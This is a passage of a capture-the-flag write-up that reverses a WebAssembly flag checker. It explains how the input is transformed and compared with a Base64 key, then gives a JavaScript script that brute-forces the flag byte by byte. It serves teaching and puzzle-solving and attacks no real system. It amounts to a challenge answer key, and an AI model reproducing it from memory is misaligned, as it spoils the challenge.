+var strBuf = new TextEncoder().encode(flag.slice(0, 64));</code></pre><p>When the <code>Uint8Array</code> constructor "is called with a buffer, and optionally a byteOffset and a length argument, a new typed array view is created that views the specified ArrayBuffer. (...)" [<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array/Uint8Array">Source</a>]. </p><p>In this case, the <code>inBuf</code> variable represents a typed array that (most likely) views the entirety of the <code>memory.buffer</code> (this depends on how the <code>getInStrOffset</code> function works and we don't have access to it).</p><pre><code class="language-javascript">var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);</code></pre><p>Then, this new <code>Uint8Array</code> is filled with the bytes from <code>strBuf</code>.</p><pre><code class="language-javascript">for (let i = 0; i &lt; strBuf.length; i++) {
+    inBuf[i] = strBuf[i];
+}</code></pre><p>Finally, the <code>Uint8Array</code> constructor is called with <code>morph</code> as the second parameter. We don't really know what <code>morph</code> does but it seems that the <code>inBuf</code> bytes are being transformed (somehow) and written to the <code>outBuf</code> array.</p><pre><code class="language-javascript">var morph = m.exports.morph(strBuf.length);	
+var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);</code></pre><h3 id="3-string-comparison">3. String comparison</h3><p>Finally the bytes in the <code>outBuf</code> are decoded back into ASCII, then encoded using Base64, and then compared with the hardcoded base64 key: if they're equal, success!</p><pre><code class="language-jsx">btoa(new TextDecoder().decode(outBuf)) === "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ"
+</code></pre><h2 id="1-finding-the-uint8array-that-matches-the-flag">1. Finding the Uint8Array that matches the flag</h2><p>We start by reversing the last step in order to get the <code>outBuf</code> that when encoded matches the hardcoded key:</p><pre><code class="language-javascript">var key = "dxB9BH8RVRMKG1NPI3UyOFRIJyJObAZdXkF8DUEJ"
+var base64decoded = atob(key)
+var textEncoded = new TextEncoder().encode(base64decoded)
+console.log(textEncoded)
+// Uint8Array(30) [119, 16, 125, 4, 127, 17, 85, 19, 10, 27, 83, 79, 35, 117, 50, 56, 84, 72, 39, 34, 78, 108, 6, 93, 94, 65, 124, 13, 65, 9]
+</code></pre><h2 id="2-brute-forcing-for-the-solution">2. Brute-forcing for the Solution</h2><p>In order to get the flag, we're going to brute-force the solution by comparing the  <code>outBuf</code> that results from each char with the successful buffer found in the previous step, byte by byte.</p><pre><code class="language-javascript">var bin = new Uint8Array([0,97,115,109,1,0,0,0,1,...]);
+var m = new WebAssembly.Instance(new WebAssembly.Module(bin));
+var offset = m.exports.getInStrOffset();
+
+var successOutBuf = [119, 16, 125, 4, 127, 17, 85, 19, 10, 27, 83, 79, 35, 117, 50, 56, 84, 72, 39, 34, 78, 108, 6, 93, 94, 65,  124, 13, 65, 9];
+
+var alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\"#$%&amp;\\'()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~";
+
+var match = function(flag, pos) {
+	console.log("Test flag: " + flag)
+	var strBuf = new TextEncoder().encode(flag.slice(0, 64));
+	var inBuf = new Uint8Array(m.exports.memory.buffer, offset, strBuf.length);
+  for (var i = 0; i &lt; strBuf.length; i++) {
+		inBuf[i] = strBuf[i];
+  }
+  var morph = m.exports.morph(strBuf.length);	
+  var outBuf = new Uint8Array(m.exports.memory.buffer, morph, strBuf.length);
+  console.log("Comparing " + outBuf[pos] + " with " + successOutBuf[pos])
+  if (outBuf[pos] == successOutBuf[pos]) {
+	  return true;
+  }
+  return false;
+}
+  
+
+var pos = 0;
+var flag = "";
+var letter = 0;
+var foundPos = false;
+
+while (pos &lt; 30) {
+	foundPos = false
+  for (var letter = 0; letter &lt; alphabet.length; letter++) {
+	  if (!foundPos) {
+	    var tmpLetter = alphabet[letter];
+      var testFlag = flag + tmpLetter;
+      var foundPos = match(testFlag, pos);
+      if (foundPos) {
+	      flag += tmpLetter;
+        console.log("Found match! Updated flag: " + flag);
+        pos++;
+      }
+    }
+  }
+  if (!foundPos) {
+    alert("Didn't find match!")
+  }
+}
+</code></pre><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/res.png" class="kg-image" alt="Web Assembly CTF Write-up"></figure><p>Hope you enjoyed it :)</p>]]></content:encoded></item></channel></rss>
